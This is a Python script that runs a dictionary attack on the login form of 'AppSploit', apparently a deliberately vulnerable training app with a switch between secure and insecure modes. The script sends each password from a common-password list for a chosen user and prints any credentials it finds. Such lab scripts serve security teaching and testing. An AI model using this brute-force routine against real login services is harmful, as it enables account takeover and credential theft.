#!/usr/bin/env python3
import sys
import os
import requests as rq
import json
import argparse

parser = argparse.ArgumentParser(description="Perform a dictionary attack against AppSploit.")
parser.add_argument("url", default="http://localhost", type=str)
parser.add_argument("target_user", type=str)
parser.add_argument("secure", type=str, choices=["secure", "unsecure"])
args = parser.parse_args()

#Process CLI args
appsploit_url = args.url.rstrip("/")
target_user = args.target_user
secure = False if args.secure == "unsecure" else True

#Use provided url to AppSploit to build endpoints for attack
appsploit_login_url = f"{appsploit_url}/login"
appsploit_toggle_secure_url = f"{appsploit_url}/togglesecure"

#File containing list of common passwords to test against provided AppSploit user
common_passwords_path = os.path.join(sys.path[0], "common_passwords.txt")
passwords = list()
with open(common_passwords_path, "r") as common_passwords:
    for pw in common_passwords:
        passwords.append(pw.rstrip("\n"))

with rq.Session() as s:
    if secure:
        #Defaults to insecure session -> toggle to secure if running against secure
        res = s.get(appsploit_toggle_secure_url)
        res_text = json.loads(res.text)

        if res_text["secure"] != secure:
            #If the session was already secure and secure mode was requested, toggle back
            res = s.get(appsploit_toggle_secure_url)
            res_text = json.loads(res.text)

    success = False
    for password in passwords:
        payload = {
            "username":target_user,
            "password":password
        }

        #Attempt login
        res = s.post(appsploit_login_url, payload)

        #Check for invalid user/password message
        idx = res.text.find("invalid username and/or password")
        
        #If invalid user/password message not found, login successful
        if idx < 0:
            success = True
            break

    if success:
        print(f"[{parser.prog}] Credentials found: ('{target_user}','{password}')")
    else:
        print(f"[{parser.prog}] No credentials found for user '{target_user}'")
